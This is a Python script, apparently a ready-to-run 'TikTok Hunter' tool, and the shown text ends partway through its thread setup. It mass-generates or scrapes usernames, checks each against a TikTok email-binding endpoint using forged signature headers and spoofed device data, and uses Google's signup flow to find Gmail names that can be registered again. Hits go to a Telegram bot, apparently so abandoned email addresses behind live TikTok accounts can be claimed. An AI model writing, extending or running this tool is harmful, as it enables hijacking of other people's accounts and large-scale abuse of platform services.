import time
from datetime import datetime
current_time = datetime.now()
expiry_time = datetime.strptime('''2026-4-19 12:00:00.000''', '''%Y-%m-%d %H:%M:%S.%f''')
if current_time > expiry_time:
    print('\x1b[38;5;220m ➔ \x1b[38;5;48m تـم ايـقـاف الاداة')
    exit(0)

import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
import threading
import requests
import secrets
import binascii
from datetime import datetime
from threading import Thread, Timer
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from colorama import Fore, Style, init
from urllib.parse import urlencode
from faker import Faker

init(autoreset=True)

# تنصيب المكتبات المطلوبة
try:
    import requests
    import base64
    from uuid import uuid4
    import random
    from faker import Faker
    from user_agent import generate_user_agent
    import time
    import hashlib
    import uuid
    import json
    from secrets import token_hex
    import threading
    import secrets
    import binascii
    from urllib.parse import urlencode
except:
    os.system("pip install requests faker user_agent")

try:
    from MedoSigner import Argus, Gorgon, md5, Ladon
except:
    os.system('pip install MedoSigner')
    os.system('pip install cryptography')
    os.system('pip install pycryptodome')
    from MedoSigner import Argus, Gorgon, md5, Ladon

fake = Faker()

# الألوان
E = '\033[1;31m'
W9 = "\033[1m\033[34m"
M = '\x1b[1;37m'
HH = '\033[1;34m'
R = '\033[1;31;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
Y = '\033[1;33m'
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
A = '\033[2;34m'
S = '\033[2;36m'
G = '\033[1;34m'
O = '\x1b[38;5;208m'
U = '\x1b[1;37m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
gre = '\033[2;32m'
red = '\033[1;31m'

# المتغيرات العامة
hit = 0
gg = 0
bb = 0
go = 0
bm = 0
email = ""
secret = secrets.token_hex(16)
session = requests.Session()

print(f'''{B}{E}=============================={B}
|{F}[+] YouTube    : {B} lilvedak
|{F}[+] TeleGram  : {B}@MRX_1wc   |
|{F}[+] Instagram  : {B}Abdo.ma.2 |
|{F}[+] Tool  : {B}TikTok Hunter - Gmail Edition |
{E}==============================''')

TOKEN = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  : ' + Z)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F} : ' + Z)
print(X + ' ═════════════════════════════════  ')

def PLAY():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━
[0] Dev : @MRX_1wc
 | TikTok Hunter Tool - Gmail Edition
━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} {F}HIT  -  تم الصيد    » 「{hit}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{B} [2] {B} {B} Available TikTok - متاح   » 「{gg}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [3] {Z} {Z}BAD TikTok - مش متاح   » 「{bb}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{A} [4] {A} {A}Good Gmail - جيميل صح » 「{go}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{X} [5] {X} {X}BAD - ايميل خاطئ   » 「{bm}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [6] {U} {U}email  » 「{email}」| 
━━━━━━━━━━━━━━━━━━━━━━━━━''')

def pppp():
    ge = hit
    bt = bb + bm
    be = gg
    print(f"\r          {B}<|  {C1}True : {M}{ge}  {E} Bad {HH}: {M}{bt}  {W9}False {HH} : {M}{be}    {R}|> \r", end='')

def update_stats():
    pppp()

# وظائف TikTok
def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
    data = payload
    if not unix: unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
    }

def para():
    global session, secret
    cookies = {
        "passport_csrf_token": secret,
        "passport_csrf_token_default": secret,
        "sessionid": "7996607fce2a48f42d2a8543ff0c2873"
    }
    session.cookies.update(cookies)
    device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
    device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
    regions = ["AE", "IQ", "US", "FR", "DE"]
    languages = ["ar", "en", "fr", "de"]
    params = {
        'passport-sdk-version': "6030790",
        'iid': str(random.randint(1, 10**19)),
        'device_id': str(random.randint(1, 10**19)),
        'ac': "WIFI",
        'channel': "googleplay",
        'aid': "1233",
        'app_name': "musical_ly",
        'version_code': "360505",
        'version_name': "36.5.5",
        'device_platform': "android",
        'os': "android",
        'ab_version': "36.5.5",
        'ssmix': "a",
        'device_type': random.choice(device_types),
        'device_brand': random.choice(device_brands),
        'language': random.choice(languages),
        'os_api': str(random.randint(28, 34)),
        'os_version': str(random.randint(10, 14)),
        'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
        'manifest_version_code': "2023605050",
        'resolution': "1440*2969",
        'dpi': str(random.choice([420, 480, 532])),
        'update_version_code': "2023605050",
        '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
        'is_pad': "0",
        'app_type': "normal",
        'sys_region': random.choice(regions),
        'last_install_time': str(random.randint(1600000000, 1700000000)),
        'mcc_mnc': "41820",
        'timezone_name': "Asia/Baghdad",
        'carrier_region_v2': "418",
        'app_language': random.choice(languages),
        'carrier_region': random.choice(regions),
        'ac2': "wifi",
        'uoo': "0",
        'op_region': random.choice(regions),
        'timezone_offset': str(random.randint(0, 14400)),
        'build_number': "36.5.5",
        'host_abi': "arm64-v8a",
        'locale': random.choice(languages),
        'region': random.choice(regions),
        'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
        'cdid': str(uuid.uuid4()),
        'support_webview': "1",
        'reg_store_region': random.choice(regions).lower(),
        'user_selected_region': "0",
        'cronet_version': "1c651b66_2024-08-30",
        'ttnet_version': "4.2.195.8-tiktok",
        'use_store_region_cookie': "1"
    }
    return params

def headd():
    global session, secret
    pp = para()
    m = sign(params=urlencode(pp), payload="", cookie="")
    app_name = "com.zhiliaoapp.musically"
    app_version = f"{random.randint(2000000000, 3000000000)}"
    platform = "Linux"
    os = f"Android {random.randint(10, 15)}"
    locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
    locale = random.choice(locales)
    device_types = ["phone", "tablet", "tv"]
    device_type = random.choice(device_types)
    build = f"UP1A.{random.randint(200000000, 300000000)}"
    cronet_version = f"{random.randint(10000000, 20000000)}"
    cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
    quic_version = f"{random.randint(10000000, 20000000)}"
    quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"

    user_agent = (f"{app_name}/{app_version} ({platform}; U; {os}; {locale}; {device_type}; "
                  f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                  f"QuicVersion:{quic_version} {quic_date})")

    headers = {
        'User-Agent': user_agent,
        'x-tt-passport-csrf-token': secret,
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-argus': m["x-argus"],
        'x-gorgon': m["x-gorgon"],
        'x-khronos': m["x-khronos"],
        'x-ladon': m["x-ladon"],
    }
    return headers, pp

def get_tiktok_info(user):
    """جلب معلومات TikTok للمستخدم"""
    try:
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
        }

        tikinfo = requests.get(f'https://www.tiktok.com/@{user}', headers=headers).text
        info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
        
        try:
            country = str(info.split('region":"')[1]).split('",')[0]
        except:
            country = "Unknown"
        try:
            like = str(info.split('heart":')[1]).split(',"')[0]
        except:
            like = "0"
        try:
            name = str(info.split('nickname":"')[1]).split('",')[0]
        except:
            name = user
        try:
            followers = str(info.split('followerCount":')[1]).split(',"')[0]
        except:
            followers = "0"
        try:
            following = str(info.split('followingCount":')[1]).split(',"')[0]
        except:
            following = "0"
        try:
            video = str(info.split('videoCount":')[1]).split(',"')[0]
        except:
            video = "0"
        try:
            id = str(info.split('id":"')[1]).split('",')[0]
        except:
            id = "Unknown"
        try:
            private = str(info.split('privateAccount":')[1]).split(',"')[0]
        except:
            private = "false"

        return {
            'name': name,
            'country': country,
            'like': like,
            'followers': followers,
            'following': following,
            'video': video,
            'id': id,
            'private': private
        }
    except:
        return {
            'name': user,
            'country': "Unknown",
            'like': "0",
            'followers': "0",
            'following': "0",
            'video': "0",
            'id': "Unknown",
            'private': "false"
        }

def check_gmail(email):
    """فحص Gmail باستخدام Google API"""
    global go, bm
    try:
        if "@" in email:
            email = email.split("@")[0]
        
        s = requests.Session()
        
        # الحصول على معلومات الجلسة
        headers = {
            'accept': '*/*',
            'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'dnt': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-same-domain': '1',
        }
        
        params = {
            'biz': 'false',
            'continue': 'https://mail.google.com/mail/u/0/',
            'ddm': '1',
            'emr': '1',
            'flowEntry': 'SignUp',
            'flowName': 'GlifWebSignIn',
            'followup': 'https://mail.google.com/mail/u/0/',
            'osid': '1',
            'service': 'mail',
        }
        
        response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
        TL = response.url.split('TL=')[1]
        at = str(response.text).split('"SNlM0e":"')[1].split('"')[0].replace(':', '%3A')
        
        # إنشاء اسم عشوائي
        abc = 'azertyuiopmlkjhgfdsqwxcvbn'
        name = ''.join(random.choice(abc) for i in range(random.randrange(5, 10)))
        
        # طلب الاسم
        params = {
            'rpcids': 'E815hb',
            'source-path': '/lifecycle/steps/signup/name',
            'hl': 'en-US',
            'TL': TL,
            'rt': 'c',
        }
        
        data = f'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{name}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
        
        response = s.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, headers=headers, data=data)
        
        # طلب تاريخ الميلاد
        params = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',
            'hl': 'en-US',
            'TL': TL,
            'rt': 'c',
        }
        
        birth_year = random.randint(1990, 2007)
        data = f'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{birth_year}%2C5%2C20%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3CpGhqaDACAAbe5ec5_uWNRGP8ADzN4FP0ADQBEArZ1Bi3KqRJ2jEufwzhM9DCOkC4py-Spwe8Dm8vIGEUYahQ0cFE1MsIiaW04C_7CxtFzQAAAladAAAAC6cBB7EATZbZc1lblBs3Pyjn18zoKs0dzS4aUpxAwryVbv8iPsaM1XfBJCrUEYx0hOeeUpwbG0Hh59jAFDOul1Q_nXL2xdN3okPfS1tlHQRMBJkUVg39qy9DpG6iLGbC4D3MlzWYexF_GQc5fwWVzu6zeexxryAR74fHHwp0x0VOHm6vsiReDmPuSJw-gea4iEzzhe0QA2CCW_YekjZ0Qu3W544ixt8rdoYcsk8Jx21EFQ2k8f_vdzbtHtdhYJl2In3oIPKXLAuFtsQmkrO0x0myDa_sbuNf8EPswGx_xGrBNciJwrVAVt8jmaK1kncj4VeueZn8pvlElhCpvVkyxFaJdlklKjKbvq4AGdu65_wFWX-nSbvq_EujfCGd1jF2uVxfx9GxGCkETqWFX2TItzMYOygG39N3e0u9zxG2rR9WxO1EKw-wOv_T_Nyc9UuV4oeTCC9s66OE7HyvcZn17B58qzplRRM6xOPKqaAL6blvAlAmsDvujYBUGZmXO4558-0rCrIF6_tyceib3scY62d_lGyGe-qLvMwRJ0a3JOo_r9S2vq15Pt6VATO-nzhs2mpk-K7_A6r9PC9KMxgktD_q7y9lhF_Hd1Hb92Rz2OgzCwuat9LnEIA6rNkoJ5Ev52PFtblk-NNHz3RmX_wLZ86pYeUgMfVTTlOBEQBodV97FHO_QV-4BtwPST0xe9P3zkAEiuFYf4KFwjj131Icb_a8sX_Rd9_ebfpRfvb76EWJyTfnW7WCTzyph22-lFrMnPcGK92FOUod62lZFoEy84QzevvX311QwdDuJWdqPwmvBEHMYpfW5yKlrxOr4f8i2DimNkRq2MiDbsW2ZnnnXhKzBAQgYghjSaAJ3ofdFhfE5yBWynv3IVxW_rEgpE7CYAPopkWqZUVsBtH0FA8o08ZSvmlt0p-thgwYQgJHmiWtTyMek5c_cSdoN5cqLk-JxOL2XBE68aPGC1JKyFCACcDCNnJR3DzncD1ZS4lchyFPsKyyalMzWp53CNH2aeoKLAdHyVz8TgpM56GcO1PpWKYzu0882T-AWvCaZEKqi9Qyb8fvCLFaxlzMGVEvCn2dU2q5LBNxJ0VsjljtR_aqLSEQ4tx5EITA5cyYA1-S_rQtDuCvCGC1-fDf8bsAckU7RNMh5pKZlXvzhlnHTnex6r6CaI7EnqUkw-NcuZpqq65s2o_4CnS23t5EAY7hTcBseN9h1eFkse2KnNDou38FjETsJpb6Fy1mLu-yzQ0tD152f39v9RVEUP4oMFLJO76O899vkgxxL3rQLk8EGXQDqaFjN5busj4VOhI6NIjqf1i9K0gKaBoHGSHG3gBqkXYXygJeiy_f8J2-VeG44bwNZl_m5P6L-Ce8c91zzZswM1MhPZqnz8_JUW-2LcBw5fNFDnQQ-fynszm4WY8F3PXxhdEoaun9xLOtqIeR8GPXPadPdE13RsBQdSibk6pw7ixPqieKkUbFD5wIKTD_UZf8tO0vc2QWH_5gHSSX-WjIoOEXHYWgUQt99fCXNTx1P8XL27N4CDgYR82-9QENXeP7qPAYBfcnWrtkvlRC8aRyxoMA_xS8BpYtsb5nKu1H6n4Mk4wgf0MZLIgC5E__IJy4ojRBCbBwams04rUlXWyB2llJ0Lo4SunQffsLiQqGxhMzhkwStuPgv7BHXY-kDPLyZXx-cewDw9ZjhvtJPpK6nW873_WkIO542o7kF_oNZRlE3pyLbdOabPG11KCjMIZgBEVpdzPssPPu6TXvh6F6_klPozrjf35DsktV7c-c3a2OVPKoYJtcQnwCA4UnHqR_i1-N1wxlooGJ6GUBI7H8wZmj_B2jjvqFWOfdLB8_bDmEysG_brczvsnyl-mGwipdMHPRZ70HpyGOign0Rg8JAQrVOnKH_oXkFjPmzGM3vXNOJ2tndrE9Z2isXvs_RPGpgUDiNbNYyJjLCmHJWz4mvyo5DrtANi-5qifEMEdrM9kxWKolh6meQd8Vx8Z61zQR5oQSu_V6lafpELV_fK7tZSHfRwlBAxx26rZaTXDI1yxSPk9Pmt_lfPiecmlRa43bCZQVPmj3rf0nQJf3_I8rUmFv4IemINkUEZBtVVBHIjJusuRI49-zoQMp1UsmbMiL17F1_sTwibBEvk2LjbF9Jo7HbGTqtLzZ0oLButszorJ4Hp0fq9GL4tJoMT2wbACAycYSvl-9LGX8JtYoMOkKnqLg3oRCRbeitDMAaQCSuGxSUCjTxkfAD_UCs3pBPvC3jYk5sK-SuKKIO48qJ_p8AYQkFutKtclzf2-P-SQozeuQYLpf5Ch2WtFpmm40DQ58SZ8OTxzMubG_q5K1t2ZsknjqnOMfzegagfp2_Lbm2ReTba9jJdH2EZ1zSoDyMV73O1NeSG8MCfBqqtjvevUtXq1T21l-f2Pcj_KYZ09uk50rTdkbDKXJ65Rr8EaLUVYveJ6Mcc7n740N7x-v8P3VUUYjNHDlbJbrWZ7J7PvfreGCZw7_jZDHd2_Fw5NvuJH7UXnrqEVzT3xvT8Wavpj1OCTyA0ItJPrSFo3JsvBWNsKaP0F34uSxlwpteTqzORTNjxN4QaGWFpzapvX3IYCkADk8iv3Oqm3OYtwtBW6Wm8ezJoySogZME2BHlcOLIajHAPR0isdLwXXSD9dzPO_zsfKB8Q7zM9DN-xwM9mQsQrsRCTq_cUjWxiqfonxFDIZx-UT5ez-U1az-JcfIwhlCtgiRt3s88omlG7znGNZSzu9V6P3szV5oT4ydTH1wQILd50eteZxhj4z7n0QbN5NUBd9nxK5NVYMs96NuwS7ZTOJB-fd_kr85giz0Om6_CY7CGhRwAM14oPpwNeyFQWsKpXOWR3huLTGQX3iFaspc_-F-UcYbA01_gafjo9sQqjn5oYrRVRIMu1pSzlYhfFWny0RoDWIEA-2eC3xjxrYWQASloqsyDUBetIuECA3Cr5BfQj-vcBa8GmQqjUGRJ1UxreLUrtoE9K7-BUkTSqfC6_ItIp8w7SXKnD4HImqa3NMvy6tqzHhNcrdhyAsNqnQG-by00SLuBMz2eHe49gTNyBiDrIjDzUYjieEn7X8DW8Z-QKdkJ3up_h5Q4XO9MkQ0pSi-YLVpkq7BBg_tUpwzOsQyhmVqm6gIZ6zDWIsc9iEkXzROe-aHxVwPsVSOUFXuDgCHQC7PqXl_ZkfA6XoOANg6mnqDJwKmE48pDHHq11tln2yGy0sDoN7et3FGFUV5nKEhUvkDq-FX-h1vBUKFpb5wdpiENT5Bz77GyiKHK8TwvFHZTUl6jgjIhYPYscylYG1U-_38hDBDxcNeCToG1ytkEqJMBLvBj0Q0iVeehPzzxFEYYZDhupE2wjgdp_RfOhqp30fRWBNSRk-XuAb-Ruasj7q6GHSm5ih2ukiloyRWBbr9QtTuOL_6LCvP_2-0yo18mMM1Az3jsmgDZHJGYPnE8LArBa2icMHRWdI1I5W_g45CaPogPMNMbRQZCvsGJJb6vwHa_4V69uB-FIjZxEoJwS8n10nRyAzxhedAp0udy3hYy43vNGg5CYgwNq8hFBqirHq3gRnh_fwzuAl56QHlvSD9clH6mgZbGLyz3-RlbLDRUGE7ev8GR-OQ0gxA2pBhRIQOl_DuHvWS_fshRRtTGXRkxZCv2X3lz6y7hMtztBPQ06LdIb0WaIkQgjJvwEthghzRWLUlkNd5wiC6tpRHQ9yWcnyQMgX13KFDWVa8sGoVyil_Wyxn1jfqbuCnuJdkdQhg72zZ5uFxtw8eH1Mgf8ab-n6LMLUbNCsbS7cz26IV-qmsIJA-m4b9AVZMPTgprpJwWUY3JYPqesT1zeoi4ZnDCYFCXlANT4NYI3a9hX--e7SsHcYGsddaq6HrP894ffqXbfyJ5J3n5fX8UHMu4aMe9Qa43Sw8eNfXPgewGtz34AIesPXDBPcVnS3-xdoK3K6gxqu8xc-hHt6Fo8Swb7cgV7HwQ9V2qpWc3P9XsGwGjVBpM6K-x30vqW9Kw89tLPAWEOlctJ8YGMFG_fujAVNN61GpvjfTcOzIaIIxLQjMkF89TQd3XE4ncgabEhbzjIS5SUVqSi3aG5wGdQ-vB_PYGDS3xonKccgoLg_UPeDnKuFHhoPDWq9P6IJQVagPLfuzzI76f8Rj3dJH3LnDlIVPcNwlHpX-YmYCniKytU5dQnX0AWLlQy_1z77IHhWU63yrQyoMU9iky4FUaeeJsLgx3XpVpR9PjhAGCFqUrr0ykCTpgADyyrNLs62wxVw-3bA0QsBca6LfD6eKCsWUHKRuhIKzy5I9S5XQ66WhHfNcPB7XbtdsQOBMBlB0v8gM5EKjNAic56B5Jb39ILbd_WT7xywRe9If-rXg9fHnGTApfNJKKMFsRr18Twkp11HFqV5M3Eg4oClga9aVvnwd751J4hLAWdo9bep0GS8pyX_SLQOM0dqpg6kANBYlpEczBWa_gCVdfpVOvOsp5GyoQHiHZVcu8p4fmXUd60LkmjyO4fMhqHtjnQjKXJorpNcCQK8w-RjcBw8Z7liV4zZts52-J5jfrXrDd2236i6OhNDlMqb6evHStjjJcc7jKqxnQ17A1wklO68gB8st3OuFPPiJXlnczSKJOyji0BVGPQUKztyJSlz-hcKWUgHLDoyYm34SrhDurlt-pcKA5MyHHRIH5nC6wFm6orlLD5OwoKyXfB48ylnPm2gDmDvdtctEDpXy3Qa-ZILfv7rCQkTFvef2qbdvxFwpGMoP_AyX5Ah8muwu8TYVlf63HWqIzev6tM1fOUAmadvdcjqhp5GTMbm5ewqWBzQNdjU5GjQLBkvQv2yRxFmkyvwr77rvCbgcaP6FLNFG1kI8RKh1E6HoCZnsCB7MVQptShtbtuSljBcxZ50%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
        
        response = s.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, headers=headers, data=data)
        
        # فحص اسم المستخدم
        params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'hl': 'en-US',
            'TL': TL,
            'rt': 'c',
        }
        
        full_email = email + "@gmail.com"
        data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C1%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C236841%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
        
        response = s.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, headers=headers, data=data).text
        
        if 'password' in response:
            go += 1
            PLAY()
            return True
        else:
            bm += 1
            PLAY()
            return False
    except:
        bm += 1
        PLAY()
        return False

def check_tiktok_account(email):
    """فحص حساب TikTok"""
    global session, gg, bb
    headers, params = headd()
    try:
        url = "https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"
        payload = f"rules_version=v2&account_sdk_source=app&email_source=1&mix_mode=1&passport_ticket=PPTSGOSAYQ95DDATX2PENDFADNXDTNSTPZC4JU&multi_login=1&type=32&email={email}&email_theme=2"
        
        response = session.post(url, params=params, headers=headers, data=payload)
        re = response.text
        
        if "1023" in re:
            # الحساب متاح في TikTok
            gg += 1
            PLAY()
            return True
        elif "1007" in re:
            # الحساب غير متاح في TikTok
            bb += 1
            PLAY()
            return False
        else:
            bb += 1
            PLAY()
            return False
    except:
        bb += 1
        PLAY()
        return False

def tlg(email):
    """إرسال النتيجة إلى تليجرام"""
    global hit
    user = email.split("@")[0]
    hit += 1
    
    # الحصول على معلومات TikTok
    tiktok_info = get_tiktok_info(user)
    
    tlg_message = f'''
⋘─────━*MR X*━─────⋙
[💌] Email ==> {email}
[👻] Username ==> @{user}
[👱🏻] Name ==> {tiktok_info['name']}
[🔺] ID ==> {tiktok_info['id']}
[🔁] Followers ==> {tiktok_info['followers']}
[🔂] Following ==> {tiktok_info['following']}
[💗] Likes ==> {tiktok_info['like']}
[🌍] Country ==> {tiktok_info['country']}
[🎥] Videos ==> {tiktok_info['video']}
[🔒] Private ==> {tiktok_info['private']}
[↩️] URL ==> https://www.tiktok.com/@{user}
⋘─────━❤️🌚━─────⋙
𝐁𝐘 : @MRX_1wc - TikTok Edition
'''
    
    print(F + tlg_message)
    
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={tlg_message}")
    except:
        pass

    with open('tiktok_hits.txt', 'a', encoding='utf-8') as f:
        f.write(tlg_message + '\n')

def generate_username():
    """مولد أسماء المستخدمين المتقدم"""
    global email
    while True:
        try:
            # طريقة 1: استخدام كلمات عشوائية
            chars = 'abcdefghijklmnopqrstuvwxyzğüişöçñäüéèêëàâäôùûüîïç'
            username = ''.join(random.choice(chars) for i in range(random.randrange(4, 12)))
            
            # طريقة 2: استخدام أنماط شائعة
            patterns = [
                lambda: ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5, 10))) + str(random.randint(1, 999)),
                lambda: random.choice(['user', 'mr', 'miss', 'pro', 'official', 'real']) + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(3, 8))),
                lambda: ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(3, 6))) + '_' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(3, 6))),
            ]
            
            if random.choice([True, False]):
                username = random.choice(patterns)()
            
            email = username + "@gmail.com"
            
            # فحص TikTok أولاً
            if check_tiktok_account(email):
                # إذا كان متاحاً في TikTok، فحص Gmail
                if check_gmail(email.split("@")[0]):
                    tlg(email)
                    
        except Exception as e:
            pass

def generate_from_tiktok_search():
    """توليد أسماء من البحث في TikTok"""
    global email
    while True:
        try:
            # توليد كلمة بحث عشوائية
            search_chars = 'abcdefghijklmnopqrstuvwxyzğüişöçñäüéèêëàâäôùûüîïç'
            keyword = ''.join(random.choice(search_chars) for i in range(random.randrange(4, 9)))
            
            # معلومات الجهاز العشوائية
            device_id = "".join(random.choice('1234567890') for i in range(19))
            
            # headers خاصة بـ TikTok
            headers = {
                "User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {random.randrange(7, 13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{random.randrange(3, 9)}.0)'
            }
            
            # الحصول على ttwid
            try:
                ttwid_response = requests.get('https://www.tiktok.com/', headers=headers)
                ttwid = ttwid_response.cookies.get_dict().get('ttwid', '')
            except:
                ttwid = ''
            
            # الحصول على msToken
            try:
                search_url = f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&keyword={keyword}&device_id={device_id}®ion=IQ'
                search_response = requests.get(search_url, headers=headers)
                msToken = search_response.cookies.get_dict().get('msToken', '')
            except:
                msToken = ''
            
            # البحث عن المستخدمين
            search_params = {
                'aid': '1988',
                'app_language': 'en',
                'app_name': 'tiktok_web',
                'browser_language': 'en-US',
                'browser_name': 'Mozilla',
                'browser_online': 'true',
                'browser_platform': 'Win32',
                'channel': 'tiktok_web',
                'cookie_enabled': 'true',
                'cursor': str(random.randint(0, 500)),
                'device_id': device_id,
                'device_platform': 'web_pc',
                'keyword': keyword,
                'region': 'IQ',
                'msToken': msToken,
            }
            
            try:
                search_response = requests.get('https://www.tiktok.com/api/search/user/full/', params=search_params, headers=headers)
                search_data = search_response.json()
                
                if 'user_list' in search_data:
                    for user_data in search_data['user_list']:
                        if 'user_info' in user_data:
                            username = user_data['user_info'].get('unique_id', '')
                            if username and len(username) > 3:
                                email = username + "@gmail.com"
                                
                                # فحص TikTok
                                if check_tiktok_account(email):
                                    # فحص Gmail
                                    if check_gmail(username):
                                        tlg(email)
                                        
            except:
                pass
                
        except Exception as e:
            pass

def stats_loop():
    """حلقة عرض الإحصائيات"""
    while True:
        update_stats()
        time.sleep(1)

# بدء تشغيل حلقة الإحصائيات
stats_thread = Thread(target=stats_loop, daemon=True)
stats_thread.start()

# تشغيل عدة threads للعمل المتوازي
threads = []

# مجموعة من threads لتوليد الأسماء العشوائية
for i in range(250):
    t = Thread(target=generate_username)
    threads.append(t)
    t.start()

# مجموعة من threads لتوليد الأسماء من البحث في TikTok
